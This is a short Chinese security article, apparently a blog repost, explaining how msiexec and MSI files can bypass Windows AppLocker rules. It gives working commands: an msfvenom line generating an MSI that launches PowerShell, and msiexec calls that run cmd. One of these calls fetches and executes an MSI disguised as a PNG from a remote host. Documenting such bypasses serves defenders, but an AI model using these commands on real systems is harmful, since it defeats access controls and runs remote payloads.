# 绕过AppLocker系列之MSIEXEC的利用

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI0MDY1MDU4MQ==&mid=2247485065&idx=1&sn=e78d3a029a1395469e3c4ec191de0562&chksm=e916d6b3de615fa522c49d5997c2d9f83bccfdd95405d1ca976c01060c0fe7ba2af14325f3dc&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&mid=2247485065&idx=1&sn=e78d3a029a1395469e3c4ec191de0562&chksm=e916d6b3de615fa522c49d5997c2d9f83bccfdd95405d1ca976c01060c0fe7ba2af14325f3dc&scene=27#wechat_redirect)

MSIEXEC是Windows操作系统中的一个实用程序，可用于从命令行安装或配置产品。 如果环境配置不正确，则使用.MSI文件就可以允许攻击者执行权限升级或绕过AppLocker规则。 本文的以下内容表明，当系统配置为不阻止所有用户执行MSI文件时，那么系统就得不到正确的保护，因为任何一个AppLocker的可执行规则都可以轻松绕过。

可以使用Metasploit 的MsfVenom来生成用于执行命令或有效载荷的.MSI文件。

 msfvenom -f msi -p windows/exec CMD=powershell.exe > powershell.msi

No platform was selected, choosing Msf::Module::Platform::Windows from the payload

No Arch selected, selecting Arch: x86 from the payload

No encoder or badchars specified, outputting raw payload

Payload size: 199 bytes

Final size of msi file: 159744 bytes

  

![](../Images/f46458a41e5236550f280875dcc3a888.png)

使用 MsfVenom 生成 MSI 文件 

运行powershell.msi 将会打开一个PowerShell会话，这样就可以绕过AppLocker的规则了，即使已经设置了所有用户都不可以执行PowerShell。

![](../Images/a650afb76199e5abe23d5361946d25c8.png)

利用MSIEXEC 运行 PowerShell

同样可以利用这种方式运行cmd命令，即使Windows系统已经阻止了cmd命令的执行。

 msiexec /quiet /i cmd.msi

  

![](../Images/8cd8c71e8e82e92d533f921d3ecaff7a.png)

执行上述命令后，就会弹出cmd的窗口。

![](../Images/7da03fc0f02ccba4f8d9c9002a0f7828.png)

另外，msiexec实用程序还可以运行已经重命名过的MSI文件，比如重命名为PNG的MSI文件。 这些文件可以在命令提示符中本地执行或从远程执行，当然也可以绕过AppLocker规则执行。

 msiexec /q /i http://192.168.100.3/tmp/cmd.png

  

![](../Images/a09aa0083a2cf401316b7f76d491c87e.png)

利用MSIEXEC执行PNG文件，弹出cmd

上述操作同样可以用在Meterpreter payload 执行MSI文件上。
